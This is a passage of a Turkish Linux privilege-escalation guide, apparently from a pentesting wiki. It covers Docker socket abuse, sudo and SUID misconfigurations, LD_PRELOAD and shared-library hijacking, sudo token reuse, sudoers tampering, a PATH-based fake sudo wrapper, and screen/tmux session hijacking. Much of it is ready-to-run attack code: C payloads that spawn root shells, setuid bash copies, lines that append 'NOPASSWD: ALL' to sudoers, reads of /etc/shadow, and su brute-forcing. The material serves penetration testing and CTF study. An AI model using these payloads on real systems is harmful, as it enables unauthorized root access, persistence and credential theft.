Docker socket, genellikle `/var/run/docker.sock`'ta bulunur, korunması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu sokete yazma erişimine sahip olmak privilege escalation'a yol açabilir. İşte bunun nasıl yapılabileceğine dair bir döküm ve Docker CLI mevcut değilse alternatif yöntemler.

#### **Privilege Escalation with Docker CLI**

Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, ana makinenin dosya sistemine root düzeyinde erişimle bir container çalıştırmanıza olanak tanır.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI mevcut değilse bile, Docker soketi Docker API ve `curl` komutları kullanılarak yine kontrol edilebilir.

1.  **List Docker Images:** Kullanılabilir image'ların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Ana makinenin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Container'a bağlanmak ve içinde komut çalıştırmak için `socat` kullanın.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat bağlantısını kurduktan sonra, ana makinenin dosya sistemine root düzeyinde erişimle doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

Unutmayın ki eğer docker soketi üzerinde yazma izinleriniz varsa çünkü `docker` grubunun içindeyseniz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Aşağıda **docker'dan çıkmanın veya onu kötüye kullanarak yetki yükseltmenin diğer yollarını** kontrol edin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) yetki yükseltme

Eğer **`ctr`** komutunu kullanabildiğinizi fark ederseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak yetki yükseltebilirsiniz**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** yetki yükseltme

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak yetki yükseltebilirsiniz**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir işlemler arası iletişim (IPC) sistemidir. Modern Linux sistemi göz önünde bulundurularak tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; temel IPC'yi destekleyerek süreçler arasındaki veri alışverişini geliştirir ve bu, **enhanced UNIX domain sockets**'ı andırır. Ayrıca olay veya sinyal yayınlamaya yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama bildirimi, bir müzik çalar uygulamasını sessize almasını tetikleyebilir; bu da kullanıcı deneyimini iyileştirir. Ek olarak, D-Bus bir uzak nesne sistemi destekler; bu, uygulamalar arasında servis isteklerini ve method invocations yöntem çağrılarını basitleştirir, geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, **allow/deny model** üzerinde çalışır; eşleşen politika kurallarının toplu etkisine göre mesaj izinlerini (method calls, signal emissions, vb.) yönetir. Bu politikalar bus ile yapılacak etkileşimleri belirler ve bu izinlerin istismarı yoluyla yetki yükseltimine izin verebilir.

Böyle bir politikanın bir örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasında verilmiştir; root kullanıcısına `fi.w1.wpa_supplicant1`'i sahiplenme, ona gönderme ve ondan mesaj alma izinlerini ayrıntılandırır.

Belirtilmiş bir kullanıcı veya grup içermeyen politikalar evrensel olarak uygulanır; "default" bağlam politikaları ise diğer özel politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini burada nasıl keşfedip istismar edeceğinizi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı keşfetmek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel keşif
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişmeden önce daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sniff traffic yapıp yapamayacağını kontrol et. Eğer yapabiliyorsan, bazı credentials elde edebilirsin.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kim olduğunuzu (**who**), hangi **privileges**'a sahip olduğunuzu, sistemde hangi **users**'ın bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'a sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir hatadan etkilendi. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Sizi root ayrıcalıkları verebilecek herhangi bir grubun **üyesi** olup olmadığını kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkünse panonun içinde ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer **ortamın herhangi bir parolasını biliyorsanız** **bu parolayı kullanarak her kullanıcı için giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsanız ve `su` ile `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıya brute-force uygulamayı deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcılar üzerinde brute-force denemesi yapar.

## Yazılabilir PATH suiistimalleri

### $PATH

Eğer **$PATH içindeki bir klasöre yazabiliyorsanız** yazılabilir klasörün içine farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak bir komutun adıyla **bir backdoor oluşturarak** yetki yükseltmesi yapabilirsiniz; bunun için söz konusu komutun $PATH içinde sizin yazılabilir klasörünüzden önce gelen bir klasörden **yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları `sudo` ile çalıştırmaya izin verilmiş olabilir veya komutlarda suid biti setli olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmeyen komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla bazı komutları parola bilmeden çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; artık `root` dizinine bir ssh key ekleyerek veya `sh` çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu direktif, kullanıcıya bir şey çalıştırırken **bir ortam değişkeni ayarlama** olanağı sağlar:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer**'a dayanıyordu ve script root olarak çalıştırılırken rastgele bir python kütüphanesi yüklemek için **PYTHONPATH hijacking**'e **açıktı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep tarafından korunursa → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), Bash'in etkileşimsiz başlangıç davranışını kullanarak izin verilen bir komutu çalıştırırken rastgele kodu root olarak çalıştırabilirsiniz.

- Why it works: Etkileşimsiz shell'lerde Bash `$BASH_ENV`'i değerlendirir ve hedef scripti çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script veya bir shell wrapper çalıştırılmasına izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Requirements:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash`'i çağıran herhangi bir hedef veya herhangi bir bash scripti).
- `BASH_ENV`'in `env_keep` içinde olması (kontrol etmek için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `BASH_ENV` (ve `ENV`)'i `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
- sudo tarafından izin verilen komutlar için shell wrapper'lardan kaçının; mümkünse minimal binary'ler kullanın.
- Korunan env vars kullanıldığında sudo I/O logging ve uyarı (alerting) düşünün.

### Sudo yürütme atlatma yolları

**Atlayarak** diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Bir **wildcard** kullanılmışsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmemiş

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ bunu PATH değişkenini değiştirerek sömürebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman _**strings**_ ile garip bir SUID binary'nin içeriğini kontrol edin)** durumunda da kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilen SUID binary

Eğer **suid** binary **başka bir komutu yolunu belirterek çalıştırıyorsa**, o zaman, suid dosyasının çağırdığı komutla aynı adı taşıyan bir fonksiyonu **export** etmeyi deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'yi çağırdığınızda bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyici tarafından standart C kütüphanesi (`libc.so`) dahil diğerlerinden önce yüklenmesi için bir veya daha fazla paylaşılan kütüphane (.so dosyası) belirtmek için kullanılır. Bu işleme bir kütüphanenin preload edilmesi denir.

Ancak, sistem güvenliğini korumak ve özellikle **suid/sgid** yürütülebilirlerle bu özelliğin kötüye kullanılmasını önlemek için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkili kullanıcı kimliği (_euid_) eşleşmeyen yürütülebilirler için **LD_PRELOAD**'i dikkate almaz.
- suid/sgid olan yürütülebilirler için, yalnızca standart yollar içinde bulunan ve ayrıca suid/sgid olan kütüphaneler önceden yüklenir.

Yetki yükseltmesi, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, `sudo` ile komutlar çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin vererek, potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından **derleyin** şu komutla:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırırken
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable kontrolündeyse kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, doğru şekilde **.so** dosyalarını yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, exploitation için potansiyel olduğunu gösterir.

Bunu exploit etmek için, bir C dosyası oluşturarak devam edilir; örneğin _"/path/to/.config/libcalc.c"_, aşağıdaki kodu içerir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını aşağıdaki komutla bir shared object (.so) dosyasına derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine olanak tanımalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabileceğimiz bir klasörden bir library yükleyen SUID binary bulduğumuza göre, gerekli isimle library'yi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer şu gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adında bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) saldırganın yerel güvenlik kısıtlamalarını atlamak için suistimal edebileceği Unix ikili dosyalarının özenle derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir komutta **sadece argüman enjekte edebildiğiniz** durumlar için aynı şeydir.

Proje, kısıtlı shell'lerden kaçmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bind and reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için suistimal edilebilecek Unix ikili dosyalarının meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralını nasıl suistimal edebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Tokenlerini Yeniden Kullanma

Parolayı bilmediğiniz ancak **sudo erişiminiz** olduğu durumlarda, **bir sudo komutunun çalışmasını bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.

Yükselmek için gerekenler:

- Zaten `_sampleuser_` kullanıcısı olarak bir shell'e sahipsiniz
- `_sampleuser_` **`sudo` kullanarak** bir şey çalıştırmış olmalı ve bu eylem **son 15 dakika** içinde gerçekleşmiş olmalıdır (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalıdır
- `gdb` erişilebilir olmalıdır (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Tüm bu gereksinimler karşılanmışsa, **ayrıcalıkları yükseltmek için şunu kullanabilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- İlk **exploit** (`exploit.sh`) `_/tmp_` dizinine `activate_sudo_token` ikili dosyasını oluşturacaktır. Bunu oturumunuzda **sudo token'ını aktif hale getirmek** için kullanabilirsiniz (otomatik olarak bir root shell elde etmeyeceksiniz, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **ikinci exploit** (`exploit_v2.sh`) _/tmp_ dizininde **root tarafından sahip olunan ve setuid olan** bir sh shell oluşturacaktır
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak** ve **sudo tokenlerini süresiz hale getirip tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içinde oluşturulan dosyaların herhangi birinde **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ile bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üstüne yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'iniz varsa, parolayı bilmenize gerek kalmadan **sudo privileges** elde edebilirsiniz, şöyle:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimlerin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı **ilginç bilgiler elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** ayrıcalıkları **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazma izniniz varsa bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` yerine kullanılabilecek bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, root olarak kodunuzu çalıştırıp ardından kullanıcının komutunu yürütecek **yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH**'ini değiştirin (örneğin yeni yolu .bash_profile içine ekleyerek) böylece kullanıcı `sudo` çalıştırdığında sizin sudo yürütülebilir dosyanız çalışacaktır.

Kullanıcının farklı bir shell (bash olmayan) kullandığını unutmayın — yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` yüklenen yapılandırma dosyalarının **nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **diğer klasörlere işaret eder**; **kütüphaneler** bu klasörlerde **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı** anlamına gelir.

Eğer bir sebepten ötürü belirtilen yollardan herhangi birinde: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki konfigürasyon dosyasının işaret ettiği herhangi bir klasörde **bir kullanıcının yazma izni** varsa, privilege escalation gerçekleştirebilir.  
Aşağıdaki sayfada **how to exploit this misconfiguration**'e göz atın:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği bu konumda program tarafından kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece sağlanan mevcut root ayrıcalıklarının **bir alt kümesini** sağlar. Bu, root **ayrıcalıklarını daha küçük ve ayırt edici birimlere** ayırır. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece ayrıcalıkların tam kümesi azaltılır ve istismar riskleri düşürülür.\
Daha fazla bilgi edinmek ve bunların nasıl kötüye kullanılacağını öğrenmek için aşağıdaki sayfayı okuyun:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının "**cd**" ile klasöre girebileceğini ifade eder.\
**"read"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"write"** biti kullanıcının **dosyaları silebileceğini** ve **yeni dosyalar oluşturabileceğini** gösterir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilir**. Bu izinler, sahip olmayan veya grubun bir parçası olmayan belirli kullanıcılara hak tanıma veya reddetme yoluyla dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **incelik, daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresinde bulunabilir.

**Ver** user "kali"ye bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Sistemden belirli ACL'lere sahip dosyaları alın:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell sessions

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**Yeni sürümlerde** sadece **your own user**'ınıza ait **screen sessions**'a **connect** edebilirsiniz. Ancak **session içindeki ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

screen sessions listesini görüntüle
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Session'e bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Ayrıcalıklı olmayan bir kullanıcı olarak root tarafından oluşturulan tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Bir session'a bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
